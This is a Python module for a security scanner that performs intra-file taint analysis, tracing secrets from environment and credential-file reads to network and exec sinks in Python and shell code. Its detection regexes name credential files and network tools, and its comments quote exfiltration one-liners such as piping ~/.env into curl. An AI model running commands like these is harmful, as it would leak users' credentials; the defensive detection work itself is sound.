"""Intra-file taint analysis (v2 layer 6).

Tracks secret-shaped data flowing from sources (env reads, sensitive
file reads) through propagators (assignments, string ops, base64) to
sinks (network calls, exec calls, writes) within one file. Emits
TaintChain records with per-hop citations — the attack-path property.

Scope is deliberately local: one file (or one code fence), intra-
procedural. Cross-process and runtime flows are out of scope; the
sandbox (Phase 6) is the dynamic complement.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field

from .python_ast import PyModule, parse_python_source

SENSITIVE_PATH = re.compile(
    r"(?:\.ssh|\.aws|\.env|\.git-credentials|\.netrc|\.npmrc|\.pypirc|"
    r"\.config/[^\"']*(?:token|credential|auth)|/etc/(?:passwd|shadow|"
    r"secrets?)|keychain|credentials?\.json|id_rsa|id_ed25519)",
    re.IGNORECASE,
)

SENSITIVE_VAR = re.compile(
    r"(?:AWS_|GITHUB_|GH_|OPENAI_|ANTHROPIC_|STRIPE_|SLACK_|DISCORD_|"
    r"BOT_TOKEN|API_KEY|SECRET|PASSWORD|TOKEN|PRIVATE_KEY)",
    re.IGNORECASE,
)


@dataclass
class TaintStep:
    line: int
    desc: str


@dataclass
class TaintChain:
    kind: str              # 'exfil' | 'exec'
    source: TaintStep
    sink: TaintStep
    path: list = field(default_factory=list)   # intermediate steps
    severity: str = "high"
    confidence: float = 0.85

    def hops(self):
        return [self.source] + self.path + [self.sink]


# --------------------------------------------------------------------------
# Python
# --------------------------------------------------------------------------

def taint_python(module: PyModule, line_offset=0, line_map=None):
    """Taint analysis over a parsed Python module.

    line_offset: added to reported lines (for fences in markdown).
    line_map: optional {rel_line: abs_line} mapping for fences.
    """
    chains = []
    tainted = {}  # name -> [TaintStep]

    def L(lineno):
        if line_map:
            return line_map.get(lineno, lineno + line_offset)
        return lineno + line_offset

    def names_in(expr_str):
        return set(re.findall(r"[A-Za-z_][A-Za-z0-9_]*", expr_str))

    # sources: env reads and sensitive file reads taint their targets
    for a in module.assigns:
        if a.rhs_kind == "call":
            for c in module.calls:
                if c.lineno != a.lineno:
                    continue
                if c.kind == "env_read":
                    tainted[a.name] = [TaintStep(L(c.lineno), f"reads environment ({c.func})")]
                    break
                if c.kind == "file_read" and (
                        SENSITIVE_PATH.search(a.rhs) or SENSITIVE_VAR.search(a.rhs)):
                    tainted[a.name] = [TaintStep(L(c.lineno), f"reads sensitive file ({c.func})")]
                    break

    # propagators: assignments from tainted names / operations on them
    changed = True
    while changed:
        changed = False
        for a in module.assigns:
            if a.name in tainted:
                continue
            names = names_in(a.rhs)
            hit = [n for n in names if n in tainted]
            if not hit:
                continue
            steps = []
            for n in hit:
                steps.extend(tainted[n])
            steps.append(TaintStep(L(a.lineno), f"propagates through {a.name}"))
            tainted[a.name] = steps
            changed = True

    # sinks: network and exec calls whose args reference tainted names
    for c in module.calls:
        if c.kind not in ("network", "exec"):
            continue
        for arg in c.args:
            names = names_in(arg)
            hit = [n for n in names if n in tainted]
            if not hit:
                continue
            steps = []
            for n in hit:
                steps.extend(tainted[n])
            chains.append(TaintChain(
                kind="exfil" if c.kind == "network" else "exec",
                source=steps[0],
                sink=TaintStep(L(c.lineno), f"{c.func} receives tainted data ({arg})"),
                path=steps[1:],
                severity="critical" if c.kind == "network" else "high",
                confidence=0.85,
            ))
    return chains


def _sensitive_call(call):
    joined = " ".join(call.args)
    return bool(SENSITIVE_PATH.search(joined) or SENSITIVE_VAR.search(joined))


def _secret_read_before_pipe(line):
    """True when a sensitive read occurs before the first top-level pipe.

    `cat ~/.env | curl ...` -> True (read feeds the pipe).
    `curl -H "Bearer $(cat ~/.netrc)"` -> False (read is inside the
    network command's own argument, i.e. authentication, not exfil).
    """
    read = _SECRET_READ.search(line)
    if not read:
        return False
    depth = 0
    quote = None
    for i, ch in enumerate(line):
        if quote:
            if ch == quote:
                quote = None
            continue
        if ch in ("'", '"'):
            quote = ch
            continue
        if ch == "$" and i + 1 < len(line) and line[i + 1] == "(":
            depth += 1
            continue
        if depth > 0:
            if ch == ")":
                depth -= 1
            continue
        if ch == "|":
            return read.start() < i
    return False


# --------------------------------------------------------------------------
# Shell
# --------------------------------------------------------------------------

_ASGN = re.compile(r"^([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(.+)$")
_SECRET_READ = re.compile(
    r"(?:cat|curl|type|more|less|head|tail|strings|xxd|base64\s+-d|scp|rsync|sftp|zipinfo|unzip|"
    r"openssl\s+(?:enc\s+)?(?:-[A-Za-z0-9]+\s+)*-in|gpg\s+(?:-d|--decrypt)|"
    r"tar\s+[^|\n]*\s+-x)\s+"
    r"[\"']?(?:~?/?(?:\.ssh|\.aws|\.env|\.git-credentials|\.netrc|\.npmrc|"
    r"\.pypirc)|/etc/(?:passwd|shadow|secrets?)|[\"']?\$?(?:AWS_|GITHUB_|"
    r"GH_|OPENAI_|ANTHROPIC_|STRIPE_)[A-Z_]*[\"']?)",
    re.IGNORECASE,
)

_NETWORK_VERBS = frozenset({"curl", "wget", "nc", "netcat", "scp", "rsync", "sftp", "telnet", "ftp"})


def taint_shell_lines(lines, start=1):
    """Taint analysis over shell lines. Returns TaintChain list."""
    from .shell_parser import (apply_var_resolution, join_continuations,
                               parse_shell_line, resolve_var_verbs)

    chains = []
    tainted = {}  # var -> [TaintStep]

    def L(lineno):
        return lineno

    joined, line_of = join_continuations(lines)
    var_map = resolve_var_verbs(lines)
    for j, jline in enumerate(joined):
        lineno = line_of[j] + start - 1  # absolute line number
        line = apply_var_resolution(jline, var_map)
        if line.strip().startswith("#"):
            continue
        m = _ASGN.match(line.strip())
        if m:
            var, rhs = m.group(1), m.group(2)
            if _SECRET_READ.search(rhs):
                tainted[var] = [TaintStep(lineno, f"assigns {var} from a sensitive read")]
            elif var in tainted:
                tainted[var].append(TaintStep(lineno, f"{var} flows through assignment"))
        for cmd in parse_shell_line(line, lineno):
            if cmd.verb in _NETWORK_VERBS:
                for arg in cmd.args:
                    if not arg.startswith(("http", "$", "{", "`", "\"", "~", "/")):
                        continue
                    if (cmd.has_pipe and _SECRET_READ.search(line)
                            and cmd.verb in ("curl", "wget", "scp", "rsync", "sftp")
                            and _secret_read_before_pipe(line)):
                        # secret read piped INTO the network command (exfil),
                        # e.g. `cat ~/.env | curl -d @- https://x`. A read used
                        # for authentication (Authorization header) is not a
                        # pipeline feed and does not fire this branch.
                        chains.append(TaintChain(
                            kind="exfil",
                            source=TaintStep(lineno, "sensitive read"),
                            sink=TaintStep(lineno, f"{cmd.verb} sends data to {arg[:60]}"),
                            severity="critical", confidence=0.9,
                        ))
                        break
                    for var in tainted:
                        if re.search(r"\$?\{?" + re.escape(var) + r"\}?", arg):
                            chains.append(TaintChain(
                                kind="exfil",
                                source=tainted[var][0],
                                sink=TaintStep(lineno, f"{cmd.verb} sends tainted ${var} to {arg[:60]}"),
                                path=tainted[var][1:],
                                severity="critical", confidence=0.85,
                            ))
                            break
            if cmd.has_cmd_subst and _SECRET_READ.search(line):
                for arg in cmd.args:
                    if arg.startswith(("http", "$")) and ("$(" in arg or "`" in arg):
                        # v3: the substitution must be INSIDE the URL/arg
                        # itself (`curl "https://x?k=$(cat ~/.env)"`). A read
                        # in an Authorization header is authentication, not
                        # exfiltration of the read result.
                        chains.append(TaintChain(
                            kind="exfil",
                            source=TaintStep(lineno, "sensitive read in command substitution"),
                            sink=TaintStep(lineno, f"substitution result used in {cmd.verb} ({arg[:60]})"),
                            severity="high", confidence=0.8,
                        ))
                        break
    # dedupe chains with identical (source.line, sink.line, kind)
    seen = set()
    out = []
    for ch in chains:
        key = (ch.kind, ch.source.line, ch.sink.line)
        if key in seen:
            continue
        seen.add(key)
        out.append(ch)
    return out
